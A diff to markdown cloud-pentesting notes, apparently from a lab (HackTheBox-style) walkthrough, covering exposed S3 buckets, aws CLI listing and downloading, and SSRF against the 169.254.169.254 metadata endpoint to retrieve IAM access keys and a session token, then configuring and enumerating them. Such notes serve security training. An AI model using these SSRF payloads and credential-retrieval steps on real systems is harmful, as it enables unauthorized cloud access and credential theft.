@@ -37,40 +37,46 @@ I'll update this page continuously and share it when I'm satisfied with it so it
   ## Introductory material
 
   ### Introduction to Cloud Pentesting
-  * The most common cloud security problems are excessive permissions and several kinds of misconfigurations such as ignoring default settings, exposing sensitive data or simply misunderstanding how things work
-    * A major problem is publicly exposing S3 buckets, there are "search engines" for publicly accessible data in the cloud such as <a href="https://buckets.grayhatwarfare.com/">GrayHat Warfare</a>
+* The most common cloud security problems are excessive permissions and several kinds of misconfigurations such as ignoring default settings, exposing sensitive data or simply misunderstanding how things work
+* A major problem is publicly exposing S3 buckets, there are "search engines" for publicly accessible data in the cloud such as <a href="https://buckets.grayhatwarfare.com/">GrayHat Warfare</a>
 
-  * Try to interact with any S3 buckets you find, for example `https://megabank-supportstorage.s3.amazonaws.com/index-3-1-1144x912.jpg`
-    * List files with `aws s3 ls s3://megabank-supportstorage --recursive`
-    * Download files (recursively) with `aws s3 sync s3://megabank-supportstorage/pentest_report/ --recursive`
+<br>
 
-  * Compute Instance Metadata is a cloud service which provides administrative endpoints, it's usually bound to the internal IP `169.254.169.254`
-    * IMDSv2 will require token authentication to call these endpoints, but not the default IMDSv1
-    * Especially useful when exploiting an SSRF vulnerability, such as `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/`, this will reveal metadata values
+* Try to interact with any S3 buckets you find, for example `https://megabank-supportstorage.s3.amazonaws.com/index-3-1-1144x912.jpg`
+  * List files with `aws s3 ls s3://megabank-supportstorage --recursive`
+  * Download files (recursively) with `aws s3 sync s3://megabank-supportstorage/pentest_report/ --recursive`
 
-    <p align="center">
-      <img src="https://github.com/user-attachments/assets/264b0f02-be76-413b-9eaa-850347dd32d3" />
-    </p>
-    
-    * Browsing to .../iam/info with the endpoint `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/info`
+<br>
 
-    <p align="center">
-      <img src="https://github.com/user-attachments/assets/7c4bee36-fbac-4cf5-88c6-a3c9843dab56" />
-    </p>
-    
-    * This reveals the IAM role attached to the EC2 instance is `security-credentials`. Fetch them with `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/support`, which reveals the `AccessKeyId`, `SecretAccessKey` and an AWS STS token.
-    <p align="center">
-      <img src="https://github.com/user-attachments/assets/c0baf073-60af-44e6-b13c-a4b05f469e3d" />
-    </p>
+* Compute Instance Metadata is a cloud service which provides administrative endpoints, it's usually bound to the internal IP `169.254.169.254`
+* IMDSv2 will require token authentication to call these endpoints, but not the default IMDSv1
+* Especially useful when exploiting an SSRF vulnerability, such as `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/`, this will reveal metadata values
 
-    * Use `aws configure` to use these credentials, which will save them to `~/.aws/credentials`
-    * For the session token, use `aws configure set aws_session_token <token>`
-    * Check current identity and privileges with, respectively
-      * `aws sts get-caller-identity`  
-      * `aws iam list-attached-user-policies --user-name support`
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/264b0f02-be76-413b-9eaa-850347dd32d3" />
+</p>
 
-  * S3 buckets and Azure/GCP storage buckets are low hanging fruit but can contain SSH keys, passwords or other sensitive information that might help infiltrate the target (similar to an FTP server if you will)
-  * Privilege escalation within a cloud service can be useful, not just in the cloud environment as a whole
+* Browsing to .../iam/info with the endpoint `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/info`
+
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/7c4bee36-fbac-4cf5-88c6-a3c9843dab56" />
+</p>
+
+* This reveals the IAM role attached to the EC2 instance is `security-credentials`. Fetch them with `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/support`, which reveals the `AccessKeyId`, `SecretAccessKey` and an AWS STS token.
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/c0baf073-60af-44e6-b13c-a4b05f469e3d" />
+</p>
+
+* Use `aws configure` to use these credentials, which will save them to `~/.aws/credentials`
+* For the session token, use `aws configure set aws_session_token <token>`
+* Check current identity and privileges with, respectively
+  * `aws sts get-caller-identity`  
+  * `aws iam list-attached-user-policies --user-name support`
+
+<br>
+
+* S3 buckets and Azure/GCP storage buckets are low hanging fruit but can contain SSH keys, passwords or other sensitive information that might help infiltrate the target (similar to an FTP server if you will)
+* Privilege escalation within a cloud service can be useful, not just in the cloud environment as a whole
 
   ### AWS penetration testing
 
